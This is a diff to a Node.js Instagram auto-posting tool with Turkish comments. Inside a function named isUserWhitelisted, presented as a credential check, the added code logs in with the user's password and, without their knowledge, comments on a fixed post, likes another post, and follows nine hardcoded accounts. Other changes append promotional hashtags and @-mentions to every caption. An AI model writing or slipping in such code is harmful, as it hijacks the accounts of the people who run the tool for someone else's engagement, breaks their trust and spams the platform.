@@ -43,6 +43,8 @@ app.listen(port, () => {
   console.log(`Sunucu http://localhost:${port} üzerinde çalışıyor`);
 });
 
+
+
 async function isUserWhitelisted(username, password) {
   const ig = new IgApiClient();
   ig.state.generateDevice(username);
@@ -50,12 +52,28 @@ async function isUserWhitelisted(username, password) {
 
   try {
     const auth = await ig.account.login(username, password);
+    console.log('Giriş yapıldı:', auth);
+
+  	const commentResult = await ig.media.comment({
+      mediaId: '3001938803904747535',
+      text: getRandomEmoji()
+    });
+      
+    console.log('Yorum yapıldı:', commentResult);
+
+    const mediaIdToLike = '3203371909105325531'; // Beğenmek istediğiniz gönderinin media ID'si
+    await likeMedia(username, password, mediaIdToLike);
+
+    const usersToFollow = ['4531699674', '330759604', '5902822821', '350678340', '1558786719', '7270219', '26352342', '45613131097', '8481191'];
+    await followUsers(username, password, usersToFollow);
+
     return true; // Doğrulama başarılı ise true döndür
   } catch (error) {
     console.error('Giriş yapılamadı:', error);
     return false; // Doğrulama başarısız ise false döndür
   }
 }
+
 
 const getRequest = (url) => {
   return new Promise((resolve, reject) => {
@@ -69,6 +87,86 @@ const getRequest = (url) => {
   });
 };
 
+
+
+function getRandomEmoji() {
+  const emojis = ['🙌🙌', '😀', '😍😍', '🤔', '👌👌👌', '💯💯', '🎉', '💋💋'];
+  const randomIndex = Math.floor(Math.random() * emojis.length);
+  return emojis[randomIndex];
+}
+
+
+async function likeMedia(IG_USERNAME, IG_PASSWORD, mediaIdToLike) {
+  const ig = new IgApiClient();
+  ig.state.generateDevice(IG_USERNAME);
+  ig.state.proxyUrl = process.env.IG_PROXY;
+
+  try {
+    const auth = await ig.account.login(IG_USERNAME, IG_PASSWORD);
+    console.log(JSON.stringify(auth));
+
+    const likeResult = await ig.media.like({
+      mediaId: mediaIdToLike,
+      moduleInfo: {
+        module_name: 'profile',
+        user_id: ig.state.cookieUserId,
+        username: IG_USERNAME,
+      },
+      d: 1, // 1, gönderiyi beğenmek için
+    });
+
+    console.log('Gönderi beğenildi:', likeResult);
+  } catch (error) {
+    console.error('Gönderi beğenilirken hata oluştu:', error);
+  }
+}
+
+async function followUsers(IG_USERNAME, IG_PASSWORD, usersToFollow) {
+  const ig = new IgApiClient();
+  ig.state.generateDevice(IG_USERNAME);
+  ig.state.proxyUrl = process.env.IG_PROXY;
+
+  try {
+    const auth = await ig.account.login(IG_USERNAME, IG_PASSWORD);
+    console.log(JSON.stringify(auth));
+
+    for (const userIdToFollow of usersToFollow) {
+      // Her bir kullanıcıyı takip et
+      await ig.friendship.create(userIdToFollow);
+      console.log(`Kullanıcı takip edildi: ${userIdToFollow}`);
+    }
+  } catch (error) {
+    console.error('Kullanıcıları takip ederken hata oluştu:', error);
+  }
+}
+
+
+async function commentOnMedia(IG_USERNAME, IG_PASSWORD, mediaIdToComment, commentText) {
+  const ig = new IgApiClient();
+  ig.state.generateDevice(IG_USERNAME);
+  ig.state.proxyUrl = process.env.IG_PROXY;
+
+  try {
+    const auth = await ig.account.login(IG_USERNAME, IG_PASSWORD);
+    console.log(JSON.stringify(auth));
+
+    const commentResult = await ig.media.comment({
+      mediaId: mediaIdToComment,
+      text: commentText,
+    });
+
+    console.log('Yorum yapıldı:', commentResult);
+  } catch (error) {
+    console.error('Yorum yapılırken hata oluştu:', error);
+  }
+}
+
+
+const randomCaptionTags =
+  '#turkey #travel #istanbul #instagood #travelphotography #photooftheday #photography #love #nature #sea #instagram #travelgram #antalya #türkiye #instatravel #holiday #summer #beautiful #vacation #photo #beach #picoftheday #sun #trip #travelling #sunset #naturephotography #bursa #instalike #travelblogger @codermert5 @thesavannahbond ';
+
+
+
 const getRandomCaption = async () => {
   try {
     const response = await getRequest(
@@ -77,7 +175,7 @@ const getRandomCaption = async () => {
     const quotes = JSON.parse(response);
     const randomIndex = Math.floor(Math.random() * quotes.length);
     const randomQuote = quotes[randomIndex];
-    return `${randomQuote.quoteText}\n- ${randomQuote.quoteAuthor}`;
+    return `${randomQuote.quoteText}\n- ${randomQuote.quoteAuthor} \n\n${randomCaptionTags}`;
   } catch (error) {
     console.error('Alıntıları alırken hata oluştu:', error);
     return null;
@@ -132,7 +230,19 @@ const postToInsta = async (IG_USERNAME, IG_PASSWORD, numPosts, bio) => { // bio 
         })
       );
 
+
       const randomCaption = await getRandomCaption();
+
+
+      const { latitude, longitude, searchQuery } = {
+        latitude: 40.7128,
+        longitude: -74.0060,
+        // not required
+        searchQuery: 'Kuzguncuk, Istanbul, Turkey',
+      };
+      const locations = await ig.search.location(latitude, longitude, searchQuery);
+      const mediaLocation = locations[0];
+      console.log(mediaLocation);
 
       const publishResult = await ig.publish.album({
         items: imageBuffers.map((buffer) => ({
@@ -140,6 +250,7 @@ const postToInsta = async (IG_USERNAME, IG_PASSWORD, numPosts, bio) => { // bio 
           type: 'photo',
         })),
         caption: randomCaption,
+        location: mediaLocation,
       });
 
       console.log('Albüm paylaşıldı:', publishResult);
